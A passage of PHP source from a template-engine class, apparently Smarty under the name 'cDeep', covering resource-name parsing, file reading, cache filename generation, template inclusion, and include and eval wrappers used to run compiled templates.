  function _parse_resource_name(&$params)
  {

    // split tpl_path by the first colon
    $_resource_name_parts = explode(':', $params['resource_name'], 2);

    if (count($_resource_name_parts) == 1) {
      // no resource type given
      $params['resource_type'] = $this->default_resource_type;
      $params['resource_name'] = $_resource_name_parts[0];
    } else {
      if(strlen($_resource_name_parts[0]) == 1) {
        // 1 char is not resource type, but part of filepath
        $params['resource_type'] = $this->default_resource_type;
        $params['resource_name'] = $params['resource_name'];
      } else {
        $params['resource_type'] = $_resource_name_parts[0];
        $params['resource_name'] = $_resource_name_parts[1];
      }
    }

    if ($params['resource_type'] == 'file') {
      if (!preg_match('/^([\/\\\\]|[a-zA-Z]:[\/\\\\])/', $params['resource_name'])) {
        // relative pathname to $params['resource_base_path']
        // use the first directory where the file is found
        foreach ((array)$params['resource_base_path'] as $_curr_path) {
          $_fullpath = $_curr_path . DIRECTORY_SEPARATOR . $params['resource_name'];
          if (file_exists($_fullpath) && is_file($_fullpath)) {
            $params['resource_name'] = $_fullpath;
            return true;
          }
          // didn't find the file, try include_path
          $_params = array('file_path' => $_fullpath);
          require_once(cDeep_CORE_DIR . 'core.get_include_path.php');
          if(cDeep_core_get_include_path($_params, $this)) {
            $params['resource_name'] = $_params['new_file_path'];
            return true;
          }
        }
        return false;
      } else {
        /* absolute path */
        return file_exists($params['resource_name']);
      }
    } elseif (empty($this->_plugins['resource'][$params['resource_type']])) {
      $_params = array('type' => $params['resource_type']);
      require_once(cDeep_CORE_DIR . 'core.load_resource_plugin.php');
      cDeep_core_load_resource_plugin($_params, $this);
    }

    return true;
  }


  /**
     * Handle modifiers
     *
     * @param string|null $modifier_name
     * @param array|null $map_array
     * @return string result of modifiers
     */
  function _run_mod_handler()
  {
    $_args = func_get_args();
    list($_modifier_name, $_map_array) = array_splice($_args, 0, 2);
    list($_func_name, $_tpl_file, $_tpl_line) =
    $this->_plugins['modifier'][$_modifier_name];

    $_var = $_args[0];
    foreach ($_var as $_key => $_val) {
      $_args[0] = $_val;
      $_var[$_key] = call_user_func_array($_func_name, $_args);
    }
    return $_var;
  }

  /**
     * Remove starting and ending quotes from the string
     *
     * @param string $string
     * @return string
     */
  function _dequote($string)
  {
    if ((substr($string, 0, 1) == "'" || substr($string, 0, 1) == '"') &&
    substr($string, -1) == substr($string, 0, 1))
    return substr($string, 1, -1);
    else
    return $string;
  }


  /**
     * read in a file
     *
     * @param string $filename
     * @return string
     */
  function _read_file($filename)
  {
    if ( file_exists($filename) && ($fd = @fopen($filename, 'rb')) ) {
      $contents = '';
      while (!feof($fd)) {
        $contents .= fread($fd, 8192);
      }
      fclose($fd);
      return $contents;
    } else {
      return false;
    }
  }

  /**
     * get a concrete filename for automagically created content
     *
     * @param string $auto_base
     * @param string $auto_source
     * @param string $auto_id
     * @return string
     * @staticvar string|null
     * @staticvar string|null
     */
  function _get_auto_filename($auto_base, $auto_source = null, $auto_id = null)
  {
    $_compile_dir_sep =  $this->use_sub_dirs ? DIRECTORY_SEPARATOR : '^';
    $_return = $auto_base . DIRECTORY_SEPARATOR;

    if(isset($auto_id)) {
      // make auto_id safe for directory names
      $auto_id = str_replace('%7C',$_compile_dir_sep,(urlencode($auto_id)));
      // split into separate directories
      $_return .= $auto_id . $_compile_dir_sep;
    }

    if(isset($auto_source)) {
      // make source name safe for filename
      $_filename = urlencode(basename($auto_source));
      $_crc32 = sprintf('%08X', crc32($auto_source));
      // prepend %% to avoid name conflicts with
      // with $params['auto_id'] names
      $_crc32 = substr($_crc32, 0, 2) . $_compile_dir_sep .
      substr($_crc32, 0, 3) . $_compile_dir_sep . $_crc32;
      $_return .= '%%' . $_crc32 . '%%' . $_filename;
    }

    return $_return;
  }

  /**
     * unlink a file, possibly using expiration time
     *
     * @param string $resource
     * @param integer $exp_time
     */
  function _unlink($resource, $exp_time = null)
  {
    if(isset($exp_time)) {
      if(time() - @filemtime($resource) >= $exp_time) {
        return @unlink($resource);
      }
    } else {
      return @unlink($resource);
    }
  }

  /**
     * returns an auto_id for auto-file-functions
     *
     * @param string $cache_id
     * @param string $compile_id
     * @return string|null
     */
  function _get_auto_id($cache_id=null, $compile_id=null) {
    if (isset($cache_id))
    return (isset($compile_id)) ? $cache_id . '|' . $compile_id  : $cache_id;
    elseif(isset($compile_id))
    return $compile_id;
    else
    return null;
  }

  /**
     * trigger cDeep plugin error
     *
     * @param string $error_msg
     * @param string $tpl_file
     * @param integer $tpl_line
     * @param string $file
     * @param integer $line
     * @param integer $error_type
     */
  function _trigger_fatal_error($error_msg, $tpl_file = null, $tpl_line = null,
  $file = null, $line = null, $error_type = E_USER_ERROR)
  {
    if(isset($file) && isset($line)) {
      $info = ' ('.basename($file).", line $line)";
    } else {
      $info = '';
    }
    if (isset($tpl_line) && isset($tpl_file)) {
      $this->trigger_error('[in ' . $tpl_file . ' line ' . $tpl_line . "]: $error_msg$info", $error_type);
    } else {
      $this->trigger_error($error_msg . $info, $error_type);
    }
  }


  /**
     * callback function for preg_replace, to call a non-cacheable block
     * @return string
     */
  function _process_compiled_include_callback($match) {
    $_func = '_cDeep_tplfunc_'.$match[2].'_'.$match[3];
    ob_start();
    $_func($this);
    $_ret = ob_get_contents();
    ob_end_clean();
    return $_ret;
  }


  /**
     * called for included templates
     *
     * @param string $_cDeep_include_tpl_file
     * @param string $_cDeep_include_vars
     */

  // $_cDeep_include_tpl_file, $_cDeep_include_vars

  function _cDeep_include($params)
  {
    if ($this->debugging) {
      $_params = array();
      require_once(cDeep_CORE_DIR . 'core.get_microtime.php');
      $debug_start_time = cDeep_core_get_microtime($_params, $this);
      $this->_cDeep_debug_info[] = array('type'      => 'template',
      'filename'  => $params['cDeep_include_tpl_file'],
      'depth'     => ++$this->_inclusion_depth);
      $included_tpls_idx = count($this->_cDeep_debug_info) - 1;
    }

    $this->_tpl_vars = array_merge($this->_tpl_vars, $params['cDeep_include_vars']);

    // config vars are treated as local, so push a copy of the
    // current ones onto the front of the stack
    array_unshift($this->_config, $this->_config[0]);

    $_cDeep_compile_path = $this->_get_compile_path($params['cDeep_include_tpl_file']);


    if ($this->_is_compiled($params['cDeep_include_tpl_file'], $_cDeep_compile_path)
    || $this->_compile_resource($params['cDeep_include_tpl_file'], $_cDeep_compile_path))
    {
      include($_cDeep_compile_path);
    }

    // pop the local vars off the front of the stack
    array_shift($this->_config);

    $this->_inclusion_depth--;

    if ($this->debugging) {
      // capture time for debugging info
      $_params = array();
      require_once(cDeep_CORE_DIR . 'core.get_microtime.php');
      $this->_cDeep_debug_info[$included_tpls_idx]['exec_time'] = cDeep_core_get_microtime($_params, $this) - $debug_start_time;
    }

    if ($this->caching) {
      $this->_cache_info['template'][$params['cDeep_include_tpl_file']] = true;
    }
  }


  /**
     * get or set an array of cached attributes for function that is
     * not cacheable
     * @return array
     */
  function &_cDeep_cache_attrs($cache_serial, $count) {
    $_cache_attrs =& $this->_cache_info['cache_attrs'][$cache_serial][$count];

    if ($this->_cache_including) {
      /* return next set of cache_attrs */
      $_return = current($_cache_attrs);
      next($_cache_attrs);
      return $_return;

    } else {
      /* add a reference to a new set of cache_attrs */
      $_cache_attrs[] = array();
      return $_cache_attrs[count($_cache_attrs)-1];

    }

  }


  /**
     * wrapper for include() retaining $this
     * @return mixed
     */
  function _include($filename, $once=false, $params=null)
  {
    if ($once) {
      return include_once($filename);
    } else {
      return include($filename);
    }
  }


  /**
     * wrapper for eval() retaining $this
     * @return mixed
     */
  function _eval($code, $params=null)
  {
    return eval($code);
  }
  /**#@-*/
}
?>
